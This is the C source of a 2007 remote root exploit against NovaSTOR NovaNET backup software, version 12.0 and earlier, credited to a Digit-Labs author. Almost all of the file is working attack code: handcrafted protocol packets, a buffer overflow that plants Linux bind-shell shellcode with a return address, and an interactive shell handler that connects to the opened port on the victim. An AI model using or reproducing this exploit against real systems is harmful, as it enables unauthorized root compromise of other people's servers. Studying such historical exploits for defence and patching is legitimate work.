/* novanet-own-lnx.c
 *
 * Copyright (c) 2007 by <mu-b@digit-labs.org>
 *
 * NovaSTOR NovaNET <= 12.0 remote root exploit
 * by mu-b - Tue Sep 25 2007
 *
 * - Tested on: NovaSTOR NovaNET 11.0 (lnx)
 *
 * Note: this was silently fixed in NovaBACKUP NETWORK 13.0
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>

#define NOVANET_POPRET        0x8048eea   /* pop %exx
                                           * ret
                                           */

/* packet structure defines */
#define NOVANET_HDR_SZ        0x14
#define NOVANET_PKT_SZ        0x92
#define NOVANET_DOMAIN_SZ     0x1F
#define NOVANET_BUF_SZ        0x400

#define PORT_SHELL            10000
#define NOVANET_TCP_PORT      3817
#define USLEEP_TIME           100000

static char getdomain_buf[] =
  "\x54\x84\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x92\x00\x00\x00"
  "\xff\xff\xff\xff\x08\x40\x80\x00\x16\xaa\x11\x02\x4c\x84\xf4\x01"
  "\x01\x00\x00\x00\xc0\xa8\x01\xbc\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00" "digit-labs!$"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00" "Sup: Get Domain Address"
  "\x00\x00\xff\xff\x00\x00\x06\x10";

static char ack_buf[] =
  "\x51\x84\x00\x00\x00\x00\x00\x30"
  "\x05\x00\x00\x00"
  "\x18\x00\x00\x00"  /* remaining length */
  "\x00\x00\x00\x00"
  "\x01\x00\x00\x00";

static char hup_buf[] =
  "\x56\x84\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00"
  "\x14\x00\x00\x00"  /* remaining length */
  "\x00\x00\x00\x00";

static char login_buf[] =
  "\x54\x84\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x92\x00\x00\x00"
  "\xff\xff\xff\xff\x09\x20\x80\x00\xcb\x14\x4C\x02\x41\xda\x2e\x02"
  "\x01\x00\x00\x00\xc0\xa8\x01\xbc\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
  "\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"
  "\x69\x69\x69" "Dtb: Context"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\xff\xff\x00\x00\x00\x00";

static char rem_buf[] =
  "\x51\x84\x00\x00\x02\x02\x02\x32"
  "\x18\x00\x00\x00"
  "\x00\x00\x00\x00"  /* remaining length */
  "\x00\x00\x00\x00";

static char lnx_x86_bind[] =
  "\x29\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x12"
  "\x76\xfc\x7d\x83\xeb\xfc\xe2\xf4\x23\xad\xaf\x3e\x41\x1c\xfe\x17"
  "\x74\x2e\x65\xf4\xf3\xbb\x7c\xeb\x51\x24\x9a\x15\x35\x66\x9a\x2e"
  "\x9b\x97\x96\x1b\x4a\x26\xad\x2b\x9b\x97\x31\xfd\xa2\x10\x2d\x9e"
  "\xdf\xf6\xae\x2f\x44\x35\x75\x9c\xa2\x10\x31\xfd\x81\x1c\xfe\x24"
  "\xa2\x49\x31\xfd\x5b\x0f\x05\xcd\x19\x24\x94\x52\x3d\x05\x94\x15"
  "\x3d\x14\x95\x13\x9b\x95\xae\x2e\x9b\x97\x31\xfd";

static int
sock_send (int fd, char *src, int len)
{
  int n;
  if ((n = send (fd, src, len, 0)) < 0)
    {
      fprintf (stderr, "sock_send: send() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sock_recv (int fd, char *dst, int len)
{
  int n;
  if ((n = recv (fd, dst, len, 0)) < 0)
    {
      fprintf (stderr, "sock_recv: recv() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  return (n);
}

static void
shellami (int fd)
{
  int n;
  fd_set rset;
  char rbuf[1024], *cmd = "id; uname -a; uptime\n";

  sock_send (fd, cmd, strlen (cmd));

  while (1)
    {
      FD_ZERO (&rset);
      FD_SET (fd, &rset);
      FD_SET (STDIN_FILENO, &rset);

      if (select (fd + 1, &rset, NULL, NULL, NULL) < 0)
        {
          fprintf (stderr, "shellami: select() - %s\n", strerror (errno));
          exit (EXIT_FAILURE);
        }

      if (FD_ISSET (fd, &rset))
        {
          if ((n = sock_recv (fd, rbuf, sizeof (rbuf) - 1)) <= 0)
            {
              fprintf (stderr, "shellami: connection closed by foreign host.\n");
              exit (EXIT_SUCCESS);
            }
          rbuf[n] = '\0';
          printf ("%s", rbuf);
          fflush (stdout);
        }
      if (FD_ISSET (STDIN_FILENO, &rset))
        {
          if ((n = read (STDIN_FILENO, rbuf, sizeof (rbuf) - 1)) > 0)
            {
              rbuf[n] = '\0';
              sock_send (fd, rbuf, n);
            }
        }
    }
}

static int
sockami (char *host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int fd;

  if ((fd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      fprintf (stderr, "sockami: socket() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      fprintf (stderr, "sockami: gethostbyname() - %s\n", strerror (errno));
      exit (EXIT_FAILURE);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (fd, (struct sockaddr *) &address, sizeof (address)) < 0)
    {
      fprintf (stderr, "sockami: connect() - %s\n", strerror (errno));
      return (-1);
    }

  return (fd);
}

static void
novanet_get_domain (char *thost, char *d_name)
{
  char rbuf_hdr[NOVANET_HDR_SZ], rbuf_pkt[NOVANET_PKT_SZ], *pkt_ptr;
  int fd, n, rlen;

  fd = sockami (thost, NOVANET_TCP_PORT);
  if (fd == -1)
    {
      fprintf (stderr, "novanet_get_domain: sockami failed\n");
      exit (EXIT_FAILURE);
    }

  printf ("* connected to %s:%d\n", thost, NOVANET_TCP_PORT);

  printf ("** sending getdomain_buf packet...");
  if ((n = sock_send (fd, getdomain_buf, sizeof getdomain_buf - 1)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "novanet_get_domain: sock_send returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("** reading first reply...");
  if ((n = sock_recv (fd, rbuf_pkt, sizeof rbuf_pkt)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "novanet_get_domain: sock_recv returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  memcpy (d_name, &rbuf_pkt[0x54], NOVANET_DOMAIN_SZ);
  printf ("** remote domain address: %.*s\n", NOVANET_DOMAIN_SZ, d_name);

  printf ("** sending ack packet...");
  if ((n = sock_send (fd, ack_buf, sizeof ack_buf - 1)) != NOVANET_HDR_SZ + 4)
    {
      fprintf (stderr, "novanet_get_domain: sock_send returned %d (!= %d)\n",
               n, NOVANET_HDR_SZ + 4);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("** reading second reply...");
  if ((n = sock_recv (fd, rbuf_hdr, sizeof rbuf_hdr)) != NOVANET_HDR_SZ)
    {
      fprintf (stderr, "novanet_get_domain: sock_recv returned %d (!= %d)\n",
               n, NOVANET_HDR_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  rlen  = *(unsigned int *) &rbuf_hdr[12];
  if (rlen < NOVANET_HDR_SZ)
    {
      fprintf (stderr, "novanet_get_domain: remaining length invalid (<%d)\n",
               NOVANET_HDR_SZ);
      exit (EXIT_FAILURE);
    }

  rlen -= NOVANET_HDR_SZ;
  printf ("** reading %d-remaining bytes...", rlen);
  pkt_ptr = malloc (rlen * sizeof (char));

  if ((n = sock_recv (fd, pkt_ptr, rlen)) != rlen)
    {
      fprintf (stderr, "novanet_get_domain: sock_recv returned %d (!= %d)\n",
               n, rlen);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  free (pkt_ptr);

  printf ("** sending hup packet...");
  if ((n = sock_send (fd, hup_buf, sizeof hup_buf - 1)) != NOVANET_HDR_SZ)
    {
      fprintf (stderr, "novanet_own_process: sock_send returned %d (!= %d)\n",
               n, NOVANET_HDR_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n\n");

  usleep (USLEEP_TIME);
  close (fd);
}

static void
novanet_own_process (char *thost, char *d_name)
{
  char rbuf_pkt[NOVANET_PKT_SZ], *ptr;
  int fd, n, rlen;

  fd = sockami (thost, NOVANET_TCP_PORT);
  if (fd == -1)
    {
      fprintf (stderr, "novanet_own_process: sockami failed\n");
      exit (EXIT_FAILURE);
    }

  printf ("* connected to %s:%d\n", thost, NOVANET_TCP_PORT);

  memcpy (&login_buf[0x54], d_name, NOVANET_DOMAIN_SZ);

  printf ("** sending login packet...");
  if ((n = sock_send (fd, login_buf, sizeof login_buf - 1)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "novanet_own_process: sock_send returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("** reading fourth packet...");
  if ((n = sock_recv (fd, rbuf_pkt, sizeof rbuf_pkt)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "novanet_own_process: sock_recv returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  rlen = 0x138 + 1;
  *(unsigned int *) &rem_buf[12] = rlen + NOVANET_HDR_SZ;

  printf ("** sending remaining %d-bytes packet...", rlen);
  if ((n = sock_send (fd, rem_buf, sizeof rem_buf - 1)) != NOVANET_HDR_SZ)
    {
      fprintf (stderr, "novanet_own_process: sock_send returned %d (!= %d)\n",
               n, NOVANET_HDR_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  printf ("** sending hammer packet...");

  ptr = malloc (rlen * sizeof (char));
  memset (ptr, 0x41, rlen);
  *(unsigned int *) &ptr[0x134] = NOVANET_POPRET;
  memcpy (&ptr[0], lnx_x86_bind, sizeof lnx_x86_bind - 1);
  ptr[rlen - 1] = '\0';

  if ((n = sock_send (fd, ptr, rlen)) != rlen)
    {
      fprintf (stderr, "novanet_own_process: sock_send returned %d (!= %d)\n",
               n, rlen);
      exit (EXIT_FAILURE);
    }

  free (ptr);
  printf ("done\n\n");

  usleep (USLEEP_TIME);
  close (fd);

  printf ("* waiting for the shellcode to be executed...\n");
  sleep (2);
 
  if ((fd = sockami (thost, PORT_SHELL)) != -1)
    {
      printf ("+Wh00t!\n\n");
      shellami (fd);
    }
}

int
main (int argc, char **argv)
{
  char d_name[NOVANET_DOMAIN_SZ];

  printf ("NovaSTOR NovaNET <= 12.0 remote root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc < 2)
    {
      fprintf (stderr, "Usage: %s <host>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  novanet_get_domain (argv[1], d_name);
  novanet_own_process (argv[1], d_name);

  return (EXIT_SUCCESS);
}
